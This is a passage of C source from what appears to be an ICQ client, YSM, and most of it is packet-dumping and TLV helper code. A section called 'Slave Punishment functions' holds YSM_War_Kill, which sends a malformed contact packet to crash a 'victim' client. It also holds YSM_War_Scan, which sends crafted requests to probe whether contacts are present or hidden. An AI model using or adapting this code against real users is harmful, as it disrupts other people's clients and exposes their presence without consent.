        SlavesList = (slave_t *) SlavesList->suc;
    }
}

static void YSM_Scan_Slave(slave_t *slave)
{
    int8_t  dead_slave_skull[3];
    int32_t buf_len = 0, tsize = 0, reqid = 0;

    buf_len = sizeof(dead_slave_skull);
    memset(dead_slave_skull, 0, buf_len);

    /* length of the following msg */
    dead_slave_skull[1] = 0x01;
    tsize += 3; /* last byte 0 */

    reqid = rand() & 0xffffff7f;
        /* We hard-code E8 since its the same, Get AWAY automsg */
    YSM_SendMessage2Client(
        slave,
        slave->uin,
        0x02,
        0xE8,
        dead_slave_skull,
        tsize,
        0x19,
        0x00,
        reqid );

    slave->ReqID = reqid;
}


/*
 * Set of Slave Punishment functions.
 * * Attention * No real slaves were wasted during testings of these functions.
 * Any simmilarity with reality is just pure coincidence.
 **/


void YSM_War_Kill(slave_t *victim)
{
#ifdef YSM_WITH_THREADS
    char *smelling_poison, *kill_uin = "66666666666", *kill_nick = "YSM__d0ll";
    int buf_len = 0, tsize = 0;

    buf_len = strlen(kill_uin) + 1 + strlen(kill_nick) + 1;
    smelling_poison = ysm_calloc(1, buf_len, __FILE__, __LINE__);

    memcpy(&smelling_poison[0], kill_uin, strlen(kill_uin));
    tsize += strlen(kill_uin);
    smelling_poison[tsize] = (char)0xFE;
    tsize ++;
    memcpy(smelling_poison+tsize, kill_nick, strlen(kill_nick));
    tsize += strlen(kill_nick);
    smelling_poison[tsize] = (char)0xFE;
    tsize ++;

    YSM_SendContact(victim, &smelling_poison[0], "65535");
    YSM_CloseDC( victim );

    PRINTF( VERBOSE_BASE, "..blood in my hands..i'm done with the job.\n");

    ysm_free(smelling_poison, __FILE__, __LINE__);
    smelling_poison = NULL;

#else
    PRINTF(VERBOSE_BASE, MSG_ERR_FEATUISABLED "\n");
#endif
}

/* Thanks to an anonymous liquidk for the required info =) */
/* You are credited as a heroe. heh.               */

void YSM_War_Scan( slave_t *victim )
{
	slave_t *SlavesList = (slave_t *) g_slave_list.start;
	int32_t  i = 0, count = 0;

    PRINTF(VERBOSE_BASE, "Please wait..\n");
    if (victim != NULL) {
    if (!(victim->flags & FL_SCANNED)) {
        g_sinfo.scanqueue++;
                YSM_Scan_Slave(victim);
                    victim->flags |= FL_SCANNED;

    } else {
        PRINTF(VERBOSE_BASE,
            "\nWait! " 
            "already waiting a reply from this slave!.");
    }

            return;
    }

    /* Err this part of the code needs to be re-implemented */
    /* scanning a whole list is a huge problem, only works now */
    /* for a specified slave.                */

        for (i = 1; SlavesList != NULL; i++) {
                if(count >= MAX_SCAN_COUNT)
                        break;

                if(!(SlavesList->flags & FL_SCANNED)) {
            PRINTF(VERBOSE_BASE,"Scanning %s..\n",
                         SlavesList->info.NickName);

                        YSM_Scan_Slave(SlavesList);
                        SlavesList->flags |= FL_SCANNED;
                        count++;
                }

                SlavesList = (slave_t *) SlavesList->suc;
        }

    g_sinfo.scanqueue += MAX_SCAN_COUNT;

        PRINTF(VERBOSE_BASE,
                "Please wait until %d results show up" "(or the few left).\n",
                                                         MAX_SCAN_COUNT);
        PRINTF(VERBOSE_BASE,
                "Use 'scan' again to scan the missing slaves"
                " in groups of %d.\n", MAX_SCAN_COUNT);

        if (!count) {
                PRINTF( VERBOSE_BASE, "-- done with ALL SLAVES. "
            "(yo'r welcome).\n" );
    }
}

/* end of Punishment functions */


void DumpFLAP(FLAP_Head *inflap)
{
    PRINTF(VERBOSE_PACKET, "FLAP Information:\n");

    PRINTF(VERBOSE_PACKET,
        "cmd: 0x%.2X\n"
        "channel id: 0x%.2X\n"
        "seq: 0x%.2X\n"
        "dlen: 0x%.2X\n",
        inflap->cmd,
        inflap->channelID,
        Chars_2_Word(inflap->seq),
        Chars_2_Wordb(inflap->dlen));
}

void DumpSNAC(SNAC_Head *insnac)
{
    PRINTF(VERBOSE_PACKET, "SNAC Information:\n");

    PRINTF(VERBOSE_PACKET,
        "family: 0x%.2X\n"
        "subtype: 0x%.2X\n",
        Chars_2_Wordb(insnac->familyID),
        Chars_2_Wordb(insnac->SubTypeID));

#if 0
        /* sparc alignment issues here, fix them later? */
    PRINTF(VERBOSE_PACKET,
        "flags (A): 0x%.2X\n"
        "flags (B): 0x%.2X\n"
        "reqid: 0x%x\n",
        insnac->Flags_a,
        insnac->Flags_b,
        insnac->ReqID);
#endif
}

void DumpPacket(FLAP_Head *flap, int8_t *data)
{
    SNAC_Head *psnac = NULL;
    int32_t    pos = 0, x = 0;

    if (flap == NULL || data == NULL)
        return;

    if (Chars_2_Wordb(flap->dlen) >= SNAC_HEAD_SIZE)
    {
        if (flap->channelID == YSM_CHANNEL_SNACDATA)
        {
            psnac = (SNAC_Head *)data;
            pos += SNAC_HEAD_SIZE;
        }
    }

    /* dump the flap */
    DumpFLAP(flap);

    /* dump a snac if we have one */
    if (psnac != NULL) DumpSNAC(psnac);

    /* dump the rest of the data */
    if (pos < Chars_2_Wordb(flap->dlen)) {
        PRINTF(VERBOSE_PACKET,
            "Rest of data dump:\n");
        for (x = pos; x < Chars_2_Wordb(flap->dlen); x++) {
            PRINTF( VERBOSE_PACKET, "%.2X ", (u_int8_t)*(data+x));
        }

        PRINTF( VERBOSE_PACKET, "\n" );
    }
}

int InsertTLV(void *string, int type, void *dst, int len)
{
    TLV tlv;

    Word_2_Charsb(tlv.type, type);
    Word_2_Charsb(tlv.len, len);

    memcpy(dst, &tlv, sizeof(tlv));
    memcpy((char *)dst + sizeof(tlv), string, len);

    return (sizeof(tlv) + len);
}
